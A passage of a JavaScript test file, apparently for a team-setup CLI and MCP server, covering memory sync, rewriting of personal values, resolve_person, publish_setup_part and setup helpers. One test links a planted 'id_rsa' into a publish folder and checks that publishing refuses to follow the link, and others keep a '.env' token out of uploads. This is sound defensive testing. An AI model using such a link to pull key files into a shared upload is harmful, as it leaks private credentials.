    assert.equal(team.latest()["MEMORY.md"], merged, "the team has the merged index");
    assert.deepEqual((await readdir(dir)).filter((f) => f.startsWith("MEMORY.")), ["MEMORY.md"], "no conflict copy of MEMORY.md");
    assert.ok(!/Conflicts:/.test(text));
  })
);

scenario("TSU-M-15", () =>
  withHome(async (home) => {
    const v1 = { "shared.md": mem("project", "Shared") };
    const team = fakeTeam({ files: v1 });
    const dir = memoryDir(home);
    await lastSynced(dir, v1, 1);
    await write(dir, "mine.md", mem("project", "This member's note"));
    // Another member pushes while this member merges.
    let others = 0;
    team.onPush(async () => {
      if (others++ === 0) team.commit({ ...v1, "theirs.md": mem("project", "The other member's note") });
    });

    const { code, text } = await sync(team);
    assert.equal(code, 0, text);
    assert.deepEqual(team.named("pushMemoryVersion"), [["pushMemoryVersion", 1], ["pushMemoryVersion", 2]], "refused on the old version, then pushed once more");
    assert.deepEqual(Object.keys(team.latest()).sort(), ["mine.md", "shared.md", "theirs.md"], "both members' files are in the team memory");
    assert.equal(await readFile(join(dir, "theirs.md"), "utf8"), mem("project", "The other member's note"));
    assert.equal((await readState("acme")).memory[PROJECT].version, 3);

    // Refused twice: exit 2, the folder holds the merge, state.json keeps its base.
    await write(dir, "later.md", mem("project", "Later"));
    team.onPush(async () => team.commit({ ...team.latest(), [`other-${team.version()}.md`]: mem("project", "Again") }));
    const twice = await sync(team);
    assert.equal(twice.code, 2, twice.text);
    assert.match(twice.text, /moved on twice/);
    assert.ok(existsSync(join(dir, "later.md")) && existsSync(join(dir, "other-3.md")), "nothing is lost: the folder holds the merge");
    assert.equal((await readState("acme")).memory[PROJECT].version, 3, "state.json is not moved on");
  })
);

scenario("TSU-M-16", () =>
  withHome(async (home) => {
    const team = fakeTeam();
    const dir = memoryDir(home);
    const user = mem("user", "Jo prefers short answers.");
    const kept = mem("project", "Kept back.", "share: false\n");
    await write(dir, "about-me.md", user);
    await write(dir, "kept.md", kept);
    await write(dir, "notes.txt", "scratch\n");
    await write(dir, "ok.md", mem("project", "Shared."));
    const before = await tree(dir);

    const { code, text } = await sync(team);
    assert.equal(code, 0, text);
    assert.deepEqual(Object.keys(team.latest()), ["ok.md"]);
    assert.deepEqual(team.uploaded(), [mem("project", "Shared.")], "neither was sent");
    const after = await tree(dir);
    for (const path of ["about-me.md", "kept.md", "notes.txt"]) assert.equal(after[path], before[path], `${path} was not changed`);
    assert.equal(await readFile(join(dir, "about-me.md"), "utf8"), user);
  })
);

scenario("TSU-M-17", () =>
  withHome(async (home) => {
    const team = fakeTeam({ files: { "a.md": mem("project", "Team") } });
    const dir = memoryDir(home);
    await lastSynced(dir, { "a.md": mem("project", "Team") }, 1);
    const copy = mem("project", "My earlier text");
    await write(dir, "a.local-2026-11-01.md", copy);
    await write(dir, "b.md", mem("project", "New"));

    const { code, text } = await sync(team);
    assert.equal(code, 0, text);
    assert.deepEqual(Object.keys(team.latest()).sort(), ["a.md", "b.md"], "the conflict copy was not sent");
    assert.ok(!team.uploaded().includes(copy));
    assert.equal(await readFile(join(dir, "a.local-2026-11-01.md"), "utf8"), copy, "it stays on the member's computer");
  })
);

scenario("TSU-M-18", () =>
  withHome(async (home) => {
    const team = fakeTeam();
    const d = join(home, "d-copy");
    const c = join(home, "c-copy");
    await write(d, "x.md", mem("project", "x, as the D: copy has it"));
    await write(d, "y.md", mem("project", "y"));
    await write(c, "x.md", mem("project", "x, as the C: copy has it"));
    await write(c, "z.md", mem("project", "z"));
    const cBefore = await tree(c);

    const r = io();
    const code = await runSyncMemory(["--project", PROJECT, "--dir", d, "--import", c], { ...r, client: team.client, now: TODAY });
    assert.equal(code, 0, r.lines.out.join("\n"));
    assert.equal(await readFile(join(d, "x.md"), "utf8"), mem("project", "x, as the D: copy has it"), "x.md holds one text");
    assert.equal(await readFile(join(d, "x.local-2026-11-01.md"), "utf8"), mem("project", "x, as the C: copy has it"), "the other is beside it");
    assert.equal(await readFile(join(d, "z.md"), "utf8"), mem("project", "z"), "a file only in the C: copy is a local change");
    assert.deepEqual(Object.keys(team.latest()).sort(), ["x.md", "y.md", "z.md"]);
    assert.match(r.lines.out.join("\n"), /x\.md: this folder's text; the imported one is beside it as x\.local-2026-11-01\.md/);
    assert.deepEqual(await tree(c), cBefore, "the C: copy is unchanged");
  })
);

// ── sync-memory: people (Amendment 2) ────────────────────────────────────────

scenario("TSU-M-19", () =>
  withHome(async (home) => {
    const team = fakeTeam();
    const dir = memoryDir(home);
    await write(dir, "a.md", mem("project", `Reseller: call ${PHONE} after five.`));
    for (const n of [2, 3, 4]) await write(dir, `n${n}.md`, mem("project", `Again ${PHONE}.`));
    await write(dir, "n5.md", mem("project", "Written the other way: +44 7700 900456."));
    const t = terminal("s");

    const { code, text } = await sync(team, { ask: t.ask });
    assert.equal(code, 0, text);
    assert.equal(t.asked.length, 1, "asked once, however many files hold it");
    assert.ok(t.asked[0].includes(PHONE), t.asked[0]);
    assert.match(t.asked[0], /is in 5 files/);
    assert.match(t.asked[0], /in a\.md:\n {2}Reseller: call 07700 900456 after five\./, "the first line it appears on");
    assert.match(t.asked[0], /\[m\] a member's contact {2}\[p\] someone else {2}\[o\] ours, not a person {2}\[x\] leave these files out {2}\[s\] skip for now/);
    assert.deepEqual(team.uploaded(), [], "skipped for now: nothing sent");
    assert.match(text, /\nSkipped:\n- a\.md: it holds a value nobody has answered for: run `npx -y @systemdox\/mcp-server sync-memory --project notes` in a terminal/);
  })
);

scenario("TSU-M-20", () =>
  withHome(async (home) => {
    const team = fakeTeam({ answered: { [valueKey("phone", PHONE)]: { answer: "person", personId: PERSON_ID, label: "reseller, sales" } } });
    const dir = memoryDir(home);
    await write(dir, "a.md", mem("project", `Reseller: ${PHONE}.`));
    const t = terminal("n");
    const lines = [];
    const code = await syncMemory({ project: PROJECT, dryRun: false, client: team.client, out: (...l) => lines.push(...l), ask: t.ask, now: TODAY });
    assert.equal(code, 0);
    assert.equal(t.asked.length, 1);
    assert.equal(t.asked[0], "Rewrite 1 file as shown? [y/N] ", "the only question is the y/N over the diff");
    const shown = lines.join("\n");
    assert.match(shown, /The rewrite:\na\.md\n {2}- Reseller: 07700 900456\.\n {2}\+ Reseller: `con_01JC2Q8Y4M7T0X3K5N9P2R6S8V` \(reseller, sales\)\./);
    assert.deepEqual(team.named("answerValues"), []);
    assert.deepEqual(team.named("fileMemoryPeople"), []);
  })
);

scenario("TSU-M-21", () =>
  withHome(async (home) => {
    const team = fakeTeam();
    const dir = memoryDir(home);
    await write(dir, "a.md", mem("project", `Reseller: ${PHONE}.`));
    await write(dir, "b.md", mem("reference", `Ring ${PHONE} for stock.`));
    await write(dir, "c.md", mem("feedback", `Never text ${PHONE} after 8pm.`));
    const names = Object.keys(await tree(dir));
    const t = terminal("p", "reseller, sales", "y");

    const { code, text } = await sync(team, { ask: t.ask });
    assert.equal(code, 0, text);
    assert.deepEqual(team.named("fileMemoryPeople"), [["fileMemoryPeople", 1]]);
    const token = `\`${PERSON_ID}\` (reseller, sales)`;
    const here = await texts(dir);
    assert.equal(here["a.md"], mem("project", `Reseller: ${token}.`));
    assert.equal(here["b.md"], mem("reference", `Ring ${token} for stock.`));
    assert.equal(here["c.md"], mem("feedback", `Never text ${token} after 8pm.`));
    for (const [path, content] of Object.entries(await texts(home))) {
      assert.ok(!content.includes(PHONE) && !content.includes("+447700900456"), `${path} still holds the value`);
    }
    assert.deepEqual(Object.keys(await tree(dir)), names, "no copy of the old text was kept");
    assert.deepEqual(Object.keys(team.latest()).sort(), ["a.md", "b.md", "c.md"], "then synced");
    assert.match(text, /\nPeople:\n- phone, someone else, reseller, sales, `con_01JC2Q8Y4M7T0X3K5N9P2R6S8V`/);
    const report = text.slice(text.indexOf("Synced acme/notes"));
    assert.ok(report.startsWith("Synced") && !report.includes(PHONE), "the report never shows the value once rewritten");
  })
);

scenario("TSU-M-22", () =>
  withHome(async (home) => {
    const team = fakeTeam();
    const dir = memoryDir(home);
    await write(dir, "a.md", mem("project", `Reseller: ${PHONE}.`));
    await write(dir, "b.md", mem("project", `Contact ${EMAIL}.`));
    await write(dir, "clean.md", mem("project", "Nothing personal."));
    const before = await tree(dir);
    const t = terminal("p", "reseller, sales", "", "m", "", "n");
    const members = { [valueKey("email", EMAIL)]: "ctc_" + "01JC2Q8Y4M7T0X3K5N9P2R6S9W" };
    team.client.answerValues = fakeTeam({ members }).client.answerValues;

    const { code, text } = await sync(team, { ask: t.ask });
    assert.equal(code, 0, text);
    assert.equal(t.asked.at(-1), "Rewrite 2 files as shown? [y/N] ");
    const after = await tree(dir);
    for (const path of ["a.md", "b.md"]) assert.equal(after[path], before[path], `${path} did not change`);
    assert.deepEqual(Object.keys(team.latest()), ["clean.md"], "the files holding those values were not sent");
    assert.match(text, /- a\.md: it holds a value to rewrite as its identifier or ~: run `npx -y @systemdox\/mcp-server sync-memory --project notes` in a terminal/);
    assert.match(text, /- b\.md: it holds a value to rewrite/);
  })
);

scenario("TSU-M-23", () =>
  withHome(async (home) => {
    const team = fakeTeam();
    const dir = memoryDir(home);
    await write(dir, "a.md", mem("project", `Personal mobile: ${PHONE}.`));
    await write(dir, "b.md", mem("reference", `Also ${PHONE}.`));
    await write(dir, "clean.md", mem("project", "Nothing personal."));
    const t = terminal("x");

    const { code, text } = await sync(team, { ask: t.ask });
    assert.equal(code, 0, text);
    const here = await texts(dir);
    assert.equal(here["a.md"], mem("project", `Personal mobile: ${PHONE}.`, "share: false\n"), "marked share: false");
    assert.equal(here["b.md"], mem("reference", `Also ${PHONE}.`, "share: false\n"));
    assert.deepEqual(Object.keys(team.latest()), ["clean.md"], "none of them was sent");
    assert.ok(!team.uploaded().some((c) => c.includes(PHONE)));
    assert.deepEqual(team.named("answerValues"), [], "nothing is stored for a value left out");
    assert.match(text, /\nPeople:\n- phone, left out \(share: false\), 2 files/);
  })
);

scenario("TSU-M-24", () =>
  withHome(async (home) => {
    const team = fakeTeam();
    const dir = memoryDir(home);
    await write(dir, "lines.md", mem("reference", `The London office line is ${ORG_LINE}.`));
    const t = terminal("o");

    const { code, text } = await sync(team, { ask: t.ask });
    assert.equal(code, 0, text);
    assert.deepEqual(team.named("answerValues"), [["answerValues", ["ours"]]]);
    assert.equal(team.latest()["lines.md"], mem("reference", `The London office line is ${ORG_LINE}.`), "sent as written");
    assert.equal(t.asked.length, 1, "no rewrite to agree to");
    assert.match(text, /\nPeople:\n- phone, ours, not a person/);
  })
);

scenario("TSU-M-25", () =>
  withHome(async (home) => {
    const team = fakeTeam();
    const dir = memoryDir(home);
    await write(dir, "paths.md", mem("project", "Notes live in C:\\Users\\jbloggs\\git\\notes"));
    const t = terminal("y");

    const { code, text } = await sync(team, { ask: t.ask });
    assert.equal(code, 0, text);
    assert.deepEqual(t.asked, ["Rewrite 1 file as shown? [y/N] "], "the path is part of the one diff, never a question of its own");
    assert.equal(await readFile(join(dir, "paths.md"), "utf8"), mem("project", "Notes live in ~\\git\\notes"));
    assert.equal(team.latest()["paths.md"], mem("project", "Notes live in ~\\git\\notes"));
  })
);

scenario("TSU-M-26", () =>
  withHome(async (home, network) => {
    const team = fakeTeam({ answered: { [valueKey("phone", PHONE)]: { answer: "person", personId: PERSON_ID, label: "reseller, sales" } } });
    const dir = memoryDir(home);
    await write(dir, "a.md", mem("project", `Reseller: ${PHONE}.`));
    await write(dir, "b.md", mem("project", `Again ${PHONE}.`));
    await write(dir, "clean.md", mem("project", "Nothing personal."));
    const before = await tree(home);

    // From an agent: the local MCP tool, which has no terminal.
    const registered = {};
    registerTeamSetupTools({ registerTool: (name, meta, fn) => (registered[name] = { meta, fn }) }, team.client, { localFiles: true });
    const result = await registered.sync_memory.fn({ project: PROJECT });
    const text = result.content[0].text;
    assert.ok(!result.isError, text);
    const after = await tree(home);
    for (const path of Object.keys(before)) {
      if (!path.endsWith("state.json")) assert.equal(after[path], before[path], `${path} did not change`);
    }
    assert.deepEqual(team.named("answerValues"), []);
    assert.deepEqual(team.named("fileMemoryPeople"), []);
    assert.match(text, /\nSkipped:\n- a\.md: it holds a value to rewrite as its identifier or ~: run `npx -y @systemdox\/mcp-server sync-memory --project notes` in a terminal\n- b\.md: it holds a value to rewrite/);
    assert.deepEqual(Object.keys(team.latest()), ["clean.md"]);
    assert.deepEqual(network, []);

    // sync_memory is on the local server only; it takes project and dryRun.
    assert.deepEqual(Object.keys(registered.sync_memory.meta.inputSchema).sort(), ["dryRun", "project"]);
    assert.match(registered.sync_memory.meta.description, /npx -y @systemdox\/mcp-server sync-memory/);
    assert.ok(!tools({ localFiles: false }).registered.sync_memory, "absent from the hosted server");
  })
);

scenario("TSU-M-27", () =>
  withHome(async (home) => {
    const team = fakeTeam({ contactsDown: true });
    const dir = memoryDir(home);
    await write(dir, "a.md", mem("project", `Reseller: ${PHONE}.`));
    await write(dir, "b.md", mem("project", `Again ${PHONE}.`));
    await write(dir, "clean.md", mem("project", "Nothing personal."));
    const t = terminal("p", "reseller, sales");

    const { code, text } = await sync(team, { ask: t.ask });
    assert.equal(code, 0, text);
    assert.deepEqual(team.named("fileMemoryPeople"), [["fileMemoryPeople", 1]]);
    assert.deepEqual(Object.keys(team.latest()), ["clean.md"], "every other file was synced");
    assert.match(text, /- a\.md: the vault did not answer \(SYD-K019\)/);
    assert.match(text, /- b\.md: the vault did not answer \(SYD-K019\)/);
    assert.equal(await readFile(join(dir, "a.md"), "utf8"), mem("project", `Reseller: ${PHONE}.`));
  })
);

scenario("TSU-M-28", () =>
  withHome(async (home, network) => {
    const v1 = { "a.md": mem("project", "A"), "b.md": mem("project", "B") };
    const team = fakeTeam({ files: v1 });
    const dir = memoryDir(home);
    await lastSynced(dir, v1, 1);
    await write(dir, "a.md", mem("project", "A, changed here"));
    await write(dir, "c.md", mem("project", `Reseller: ${PHONE}; ${EMAIL}.`));
    await write(dir, "d.md", mem("project", `Personal: 07700 900123.`));
    team.commit({ ...v1, "b.md": mem("project", "B, changed by the team") });
    const before = await tree(home);
    const t = terminal();

    const { code, text } = await sync(team, { ask: t.ask, dryRun: true });
    assert.equal(code, 0, text);
    assert.match(text, /^Dry run of acme\/notes against version 2: would pull 1, push 1 and delete 0; 0 conflicts, 2 skipped\. Nothing was asked, written or sent\.$/m);
    assert.match(text, /\nWould pull:\n- b\.md\n/);
    assert.match(text, /\nWould push:\n- a\.md\n/);
    assert.match(text, /\nValues still to answer: 2 phone, 1 email\.$/, "how many, by kind");
    for (const value of [PHONE, "07700 900123", EMAIL, "+447700900456"]) assert.ok(!text.includes(value), `${value} is not shown`);
    assert.deepEqual(t.asked, [], "nothing was asked");
    for (const name of ["answerValues", "fileMemoryPeople", "findMissingBlobs", "uploadBlobs", "pushMemoryVersion"]) {
      assert.deepEqual(team.named(name), [], `no ${name} call`);
    }
    assert.deepEqual(await tree(home), before, "nothing was written");
    assert.equal(team.version(), 2, "nothing was sent");
    assert.deepEqual(network, []);
  })
);

test("sync-memory: the m answer re-asks without m on SYD-K021; usage errors and no key exit 1", () =>
  withHome(async (home) => {
    const team = fakeTeam();
    const dir = memoryDir(home);
    await write(dir, "a.md", mem("project", `Owner's mobile: ${PHONE}.`));
    const t = terminal("m", "", "m", "o");
    const { code, text } = await sync(team, { ask: t.ask });
    assert.equal(code, 0, text);
    assert.equal(t.asked.length, 4);
    assert.match(t.asked[0], /\[m\] a member's contact/);
    assert.ok(!t.asked[2].includes("[m]") && /Answer \(p\/o\/x\/s\)/.test(t.asked[2]), "asked again without m");
    assert.deepEqual(team.named("answerValues"), [["answerValues", ["member"]], ["answerValues", ["ours"]]]);

    for (const argv of [["--bogus"], ["--project"], ["--project", "Not A Slug"], ["--dir"]]) {
      const r = io();
      assert.equal(await runSyncMemory(argv, { ...r, client: team.client }), 1, argv.join(" "));
      assert.match(r.lines.err.join("\n"), /Usage|needs a value|not a project name/);
    }
    const r = io();
    assert.equal(await runSyncMemory([], r, {}), 1);
    assert.match(r.lines.err.join("\n"), /No SystemDox key/);
    // The command as a person runs it.
    await assert.rejects(
      run(process.execPath, [CLI, "sync-memory", "--nope"], { env: { ...process.env, HOME: home, USERPROFILE: home } }),
      (e) => e.code === 1 && /Unexpected argument --nope/.test(e.stderr)
    );
  })
);

// ── resolve_person ───────────────────────────────────────────────────────────

const PERSON = {
  personId: PERSON_ID,
  kind: "contact",
  name: "Jo Bloggs",
  phone: "+447700900456",
  email: "jo.bloggs@example.com",
  label: "reseller, sales",
};

scenario("TSU-M-29", () =>
  withHome(async (home, network) => {
    for (const localFiles of [true, false]) {
      const { registered, calls } = tools({ localFiles, person: PERSON });
      assert.ok(registered.resolve_person, `resolve_person is on the ${localFiles ? "local" : "hosted"} server`);
      const out = (await registered.resolve_person.fn({ id: PERSON_ID })).content[0].text;
      assert.deepEqual(calls.resolved, [{ workspace: "acme", id: PERSON_ID }], "the key's own workspace");
      for (const detail of [PERSON.label, PERSON.name, PERSON.phone, PERSON.email]) assert.ok(out.includes(detail), detail);
      assert.match(out, /for this session only/);
      assert.ok(out.includes(`\`${PERSON_ID}\` (reseller, sales)`), "the memory names the identifier");
      assert.match(out, /Do not write them into a memory file/);
      assert.equal(registered.resolve_person.meta.annotations.readOnlyHint, true);
    }

    const { registered } = tools({ localFiles: true, person: { ...PERSON, personId: "con_" + "01JC2Q8Y4M7T0X3K5N9P2R6S9W", mergedInto: "con_" + "01JC2Q8Y4M7T0X3K5N9P2R6S9W" } });
    assert.match((await registered.resolve_person.fn({ id: PERSON_ID })).content[0].text, /was merged into `con_01JC2Q8Y4M7T0X3K5N9P2R6S9W`/);

    for (const code of ["SYD-A001", "SYD-K016", "SYD-K019"]) {
      const { registered: r } = tools({ localFiles: true, person: new Error(`SystemDox API error 404: {"code":"${code}","detail":"${code}: refused"}`) });
      await assert.rejects(r.resolve_person.fn({ id: PERSON_ID }), new RegExp(code));
    }
    assert.equal(registered.resolve_person.meta.inputSchema.id.safeParse("../people").success, false);
    // A real member id is usr_<Cognito sub>, a UUID with hyphens (proposal item 22); a con_ admits none.
    const id = registered.resolve_person.meta.inputSchema.id;
    assert.equal(id.safeParse("usr_" + "76422294-d0d1-7023-a659-b346009638be").success, true, "a real member id");
    assert.equal(id.safeParse("con_" + "01JC2Q8Y4M-7T0X3K5N9P2R6S8V").success, false, "a con_ admits no hyphen");

    assert.deepEqual(network, []);
    assert.deepEqual(await tree(home), {}, "nothing was written to the computer");
  })
);

// ── publish_setup_part ───────────────────────────────────────────────────────

const HOOKS_JSON = '{"hooks": {"PreToolUse": [{"hooks": [{"type": "command", "command": "${CLAUDE_PLUGIN_ROOT}/scripts/check.sh"}]}]}}\n';

scenario("TSU-M-33", async () => {
  const root = await mkdtemp(join(tmpdir(), "sdx-part-"));
  try {
    const dir = join(root, "hooks-folder");
    const outside = join(root, "outside");
    await write(outside, "id_rsa", "not for the team\n");
    await write(dir, "hooks/hooks.json", HOOKS_JSON);
    await write(dir, "scripts/check.sh", "#!/bin/sh\necho ok\n");
    await write(dir, "notes.md", "my own notes\n");
    await symlink(outside, join(dir, "scripts", "linked"), "junction"); // a junction on Windows, a link elsewhere

    const { registered, calls } = tools({ localFiles: true });
    await assert.rejects(
      registered.publish_setup_part.fn({ part: "hooks", directory: dir }),
      /scripts\/linked: links are not followed.*Nothing was sent/
    );
    assert.deepEqual(calls.published, [], "nothing was sent");
    assert.equal(calls.own, 0, "the API was not even asked");

    // Without the link: only what the part accepts is read and sent.
    const clean = join(root, "clean");
    await write(clean, "hooks/hooks.json", HOOKS_JSON);
    await write(clean, "hooks/draft.json", "{}");
    await write(clean, "scripts/check.sh", "#!/bin/sh\necho ok\n");
    await write(clean, "scripts/.env", "TOKEN=x\n");
    await write(clean, "notes.md", "my own notes\n");
    await writeFile(join(clean, "shot.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01]));
    const out = (await registered.publish_setup_part.fn({ part: "hooks", directory: clean })).content[0].text;
    assert.deepEqual(calls.published.map((p) => [p.workspace, p.part]), [["acme", "hooks"]]);
    assert.deepEqual(calls.published[0].files, [
      { path: "hooks/hooks.json", content: HOOKS_JSON },
      { path: "scripts/check.sh", content: "#!/bin/sh\necho ok\n" },
    ]);
    assert.equal(
      out,
      "Published **hooks** version 3.\nTeam plugin version 7; each member accepts it at their next update.\nLeft out (not part of hooks): scripts/.env"
    );

    // A binary file, or one past ADR-216's limits, stops it too.
    await writeFile(join(clean, "scripts", "tool.bin"), Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x00]));
    await assert.rejects(registered.publish_setup_part.fn({ part: "hooks", directory: clean }), /scripts\/tool\.bin is binary/);
    await rm(join(clean, "scripts", "tool.bin"));
    await writeFile(join(clean, "scripts", "big.sh"), "x".repeat(256 * 1024 + 1));
    await assert.rejects(registered.publish_setup_part.fn({ part: "hooks", directory: clean }), /scripts\/big\.sh is 262145 bytes/);
    assert.equal(calls.published.length, 1, "nothing more was sent");
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("publish_setup_part: each part's result, the hosted server's inputs, and SYD-A003 passed through", async () => {
  const root = await mkdtemp(join(tmpdir(), "sdx-part-"));
  try {
    await write(root, ".mcp.json", '{"mcpServers": {"crm": {"command": "crm-mcp", "env": {"CRM_TOKEN": "${CRM_TOKEN}"}}}}\n');
    await write(root, "CLAUDE.md", "# Team\n");
    await write(root, "agents/reviewer.md", "---\nname: reviewer\n---\n");
    await write(root, "agents/notes.txt", "draft\n");

    const mcp = tools({
      localFiles: true,
      publish: { part: "mcp", version: 2, pluginVersion: 8, replacedValues: [{ server: "crm", field: "env", name: "CRM_TOKEN" }] },
    });
    const mcpOut = (await mcp.registered.publish_setup_part.fn({ part: "mcp", directory: root })).content[0].text;
    assert.deepEqual(mcp.calls.published[0].files.map((f) => f.path), [".mcp.json"]);
    assert.match(mcpOut, /^Published \*\*mcp\*\* version 2\.\nTeam plugin version 8; each member accepts it at their next update\./);
    assert.match(mcpOut, /- crm env CRM_TOKEN: \$\{CRM_TOKEN\}/);

    const instructions = tools({ localFiles: true, publish: { part: "instructions", version: 5 } });
    const insOut = (await instructions.registered.publish_setup_part.fn({ part: "instructions", directory: root })).content[0].text;
    assert.deepEqual(instructions.calls.published[0].files, [{ path: "CLAUDE.md", content: "# Team\n" }]);
    assert.equal(insOut, "Published **instructions** version 5.");

    const agents = tools({ localFiles: true, publish: { part: "agents", version: 1, pluginVersion: 9 } });
    const agentsOut = (await agents.registered.publish_setup_part.fn({ part: "agents", directory: root })).content[0].text;
    assert.deepEqual(agents.calls.published[0].files.map((f) => f.path), ["agents/reviewer.md"]);
    assert.match(agentsOut, /Left out \(not part of agents\): agents\/notes\.txt/);
    await assert.rejects(tools({ localFiles: true }).registered.publish_setup_part.fn({ part: "commands", directory: root }), /nothing to publish/);
    await assert.rejects(tools({ localFiles: true }).registered.publish_setup_part.fn({ part: "hooks", directory: root }), /has no hooks\/hooks\.json/);

    const refused = tools({
      localFiles: true,
      publish: new Error('SystemDox API error 403: {"code":"SYD-A003","detail":"SYD-A003: admin rank required"}'),
    });
    await assert.rejects(refused.registered.publish_setup_part.fn({ part: "mcp", directory: root }), /SYD-A003/);

    const hosted = tools({ localFiles: false });
    assert.ok(!("directory" in hosted.registered.publish_setup_part.meta.inputSchema));
    assert.ok("files" in hosted.registered.publish_setup_part.meta.inputSchema);
    await assert.rejects(hosted.registered.publish_setup_part.fn({ part: "hooks", directory: root }), /Pass `files`/);
    await hosted.registered.publish_setup_part.fn({ part: "instructions", files: [{ path: "CLAUDE.md", content: "# Team\n" }] });
    assert.deepEqual(hosted.calls.published[0].files, [{ path: "CLAUDE.md", content: "# Team\n" }]);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

// ── The detector ─────────────────────────────────────────────────────────────

scenario("TSU-M-34", async () => {
  // The same file test/person-values.test.mjs reads example by example.
  const vectors = JSON.parse(
    await readFile(join(HERE, "..", "..", "..", "specs", "changes", "team-setup", "person-values.json"), "utf8")
  );
  assert.ok(vectors.found.length && vectors.not_found.length && vectors.secret.length);
  for (const v of vectors.found) {
    const found = findPersonValues(v.text);
    assert.deepEqual(found.map((f) => [f.kind, f.value]), [[v.kind, v.value]], v.text);
    if ("normalised" in v) assert.equal(normalise(v.kind, v.value), v.normalised, v.text);
    if ("rewritten" in v) assert.equal(rewriteHomePaths(v.text), v.rewritten, v.text);
  }
  for (const v of vectors.not_found) assert.deepEqual(findPersonValues(v.text), [], `${v.text}: ${v.why}`);
  for (const v of vectors.secret) assert.deepEqual(findSecrets(v.text).map((s) => s.kind), [v.kind], v.text);
});

// ── setup ────────────────────────────────────────────────────────────────────
// The team setup runs in-process as `setup` runs it after the MCP server step:
// a temporary HOME holding a settings.json and a CLAUDE.md with the member's
// own content, a fake `claude` on PATH that prints a version and logs what it
// was asked, the API faked, the prompt injected.

const HOOK_CHECK = "${CLAUDE_PLUGIN_ROOT}/scripts/check.sh";
const HOOK_FORMAT = "${CLAUDE_PLUGIN_ROOT}/scripts/format.sh";
const INSTRUCTIONS_V1 = "# Acme\n\nWrite British English.\n";
const INSTRUCTIONS_V2 = "# Acme\n\nWrite British English.\nRun the tests before a push.\n";
const HEADERS_HELPER = "npx -y @systemdox/mcp-server marketplace-auth";
const OWN_SETTINGS = [
  "{",
  '    "model": "opus",',
  '    "permissions": {',
  '        "allow": ["Bash(git status)"]',
  "    },",
  '    "extraKnownMarketplaces": {',
  '        "team-tools": {',
  '            "source": { "source": "github", "repo": "acme/tools" }',
  "        }",
  "    }",
  "}",
  "",
].join("\n");
const OWN_CLAUDE_MD = "# My notes\n\nPrefer small commits.\n";
const TEAM_MEMORY = { "MEMORY.md": "- [A](a.md) — a note\n", "a.md": mem("project", "A, from the team") };

/** A workspace with hooks, MCP servers, instructions and a team memory, and
 * the calls that publish a new version of each. */
function fakeSetup({ memory = TEAM_MEMORY } = {}) {
  const team = fakeTeam({ files: memory });
  const instructions = [INSTRUCTIONS_V1];
  const plugins = [];
  const publishHooks = (hookCommands) => {
    const version = plugins.length + 1;
    const zipSha = sha(`plugin ${version}`);
    plugins.push({
      version,
      sha256: zipSha,
      bytes: 1,
      createdAt: "2026-11-01T12:00:00Z",
      parts: { hooks: version, mcp: 1 },
      skills: {},
      hookCommands,
      mcpServers: [
        { name: "github", command: "npx", args: ["-y", "@modelcontextprotocol/server-github"] },
        { name: "docs", url: "https://docs.example.com/mcp" },
      ],
      command: `npx -y @systemdox/mcp-server plugin-path acme --version ${version} --sha256 ${zipSha}`,
    });
  };
  publishHooks([HOOK_CHECK]);
  const client = {
    ...team.client,
    getOwnTeamSetup: async () => {
      team.calls.push(["getOwnTeamSetup"]);
      return {
        workspace: "acme",
        minClaudeCodeVersion: "2.1.316",
        marketplaceUrl: MARKETPLACE("acme"),
        plugin: plugins.at(-1),
        parts: { hooks: plugins.length, mcp: 1, instructions: instructions.length },
        skills: [],
        memory: team.version()
          ? [{ project: PROJECT, latestVersion: team.version(), fileCount: Object.keys(team.latest()).length, bytes: 1, updatedAt: "2026-11-01T12:00:00Z", spaceId: "sp_1" }]
          : [],
      };
    },
    getPartVersion: async (ws, part, version) => {
      team.calls.push(["getPartVersion", part, version]);
      assert.equal(part, "instructions");
      const content = instructions[version - 1];
      if (content === undefined) throw apiError(404, "SYD-K016");
      return { part, version, publishedAt: "2026-11-01T12:00:00Z", publishedBy: "usr_x", files: [{ path: "CLAUDE.md", bytes: content.length, sha256: sha(content), content }] };
    },
    getPlugin: async () => {
      team.calls.push(["getPlugin"]);
      return { name: "acme-setup", versions: [...plugins].reverse() };
    },
  };
  return { team, client, publishHooks, publishInstructions: (text) => instructions.push(text) };
}

/** Run `fn(log)` with a fake `claude` first on PATH printing `version`; `log()`
 * gives every argument list it was run with. */
async function withClaude(version, fn) {
  const bin = await mkdtemp(join(tmpdir(), "sdx-claude-"));
  const logFile = join(bin, "calls.log");
  if (process.platform === "win32") {
    await writeFile(join(bin, "claude.cmd"), `@echo off\r\necho %*>>"${logFile}"\r\necho ${version} (Claude Code)\r\n`);
  } else {
    await writeFile(join(bin, "claude"), `#!/bin/sh\necho "$*" >> '${logFile}'\necho "${version} (Claude Code)"\n`);
    await chmod(join(bin, "claude"), 0o755);
  }
  const saved = process.env.PATH;
  process.env.PATH = bin + delimiter + saved;
  try {
    await fn(async () => (existsSync(logFile) ? (await readFile(logFile, "utf8")).split(/\r?\n/).filter(Boolean).map((l) => l.trim()) : []));
  } finally {
    process.env.PATH = saved;
    await rm(bin, { recursive: true, force: true });
  }
}

/** The member's own ~/.claude/settings.json and ~/.claude/CLAUDE.md. */
async function ownFiles(home) {
  await write(home, ".claude/settings.json", OWN_SETTINGS);
  await write(home, ".claude/CLAUDE.md", OWN_CLAUDE_MD);
  await mkdir(join(home, "checkout"), { recursive: true });
}

/** Run the team setup as `setup` does, with the member's answers. */
async function setupRun(client, home, { answers = ["y"], yes = false, overwrite = false, isTerminal = true, keySource = "prompt", project } = {}) {
  const lines = [];
  const t = terminal(...answers);
  const code = await runTeamSetup({
    client,
    apiKey: KEY_ACME,
    keySource,
    out: (l) => lines.push(l),
    ask: t.ask,
    terminal: isTerminal,
    yes,
    overwrite,
    project,
    cwd: join(home, "checkout"),
    now: TODAY,
  });
  return { code, text: lines.join("\n"), asked: t.asked };
}

/** setup's first step, the MCP server entry, as the member answers it: the
 * key, the API URL (Enter: the default), the target ("all"). The key is
 * accepted and `client` names its workspace; no network. */
async function mcpStep(client, home, { answers = [KEY_ACME, "", "all"], env = {} } = {}) {
  const lines = [];
  const t = terminal(...answers);
  const result = await setupMcpServer({
    out: (l) => lines.push(l),
    err: (l) => lines.push(l),
    ask: t.ask,
    cwd: join(home, "checkout"),
    env,
    validateKey: async (key) => key === KEY_ACME,
    client: () => client,
  });
